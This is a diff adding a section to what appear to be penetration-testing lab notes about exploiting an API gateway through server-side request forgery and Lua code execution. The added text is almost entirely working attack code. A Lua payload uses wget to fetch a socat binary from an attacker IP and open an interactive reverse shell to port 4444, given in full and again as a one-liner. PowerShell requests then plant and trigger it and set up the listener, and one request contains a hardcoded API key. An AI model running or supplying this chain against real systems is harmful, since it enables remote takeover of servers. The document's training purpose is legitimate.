@@ -102,3 +102,34 @@ iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http:/
 ```powershell
 iwr -Uri 'http://apigateway:8000/donkey' -SkipHttpErrorCheck
 ```
+
+Interactive shell to stop the gateway from hanging. My idea was to use a static binary of socat to gain an interative shell.
+```lua
+local q = string.char(39); -- we use this to avoid a nesting quotes bullshit 39 is ascii for 
+local p0 = '/tmp/socat exec:';
+local p1 = 'bash -li';
+local p2 = ',pty,stderr,setsid,sigint,sane tcp:192.168.119.163:4444';
+local p3 = ' &';
+local payload= p0 .. q .. p1 .. q .. p2 .. p3; -- .. is the string concatenation operate (kind of like php)
+os.execute('wget http://192.168.119.163/socat -O /tmp/socat');os.execute('chmod +x /tmp/socat');os.execute(payload);
+```
+As a one liner
+```lua
+local q = string.char(39);local p0 = '/tmp/socat exec:';local p1 = 'bash -li';local p2 = ',pty,stderr,setsid,sigint,sane tcp:192.168.119.163:4444';local p3 = ' &';local payload= p0 .. q .. p1 .. q .. p2 .. p3;os.execute('wget http://192.168.119.163/socat -O /tmp/socat');os.execute('chmod +x /tmp/socat');os.execute(payload);
+```
+We can setup the reverse shell service with:
+```powershell
+iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://172.16.16.2:9000/api/render?url=http://192.168.119.163/rce_interactive_shell.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
+Setup the listener:
+```zsh
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+Trigger the reverse shell:
+```powershell
+iwr -Uri 'http://apigateway:8000/zinhart' -SkipHttpErrorCheck
+```
+Lastly we can verify the gateway is not hung up by reusing one of our previous payloads
+```powershell
+iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163/callback?gatewaynothung"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
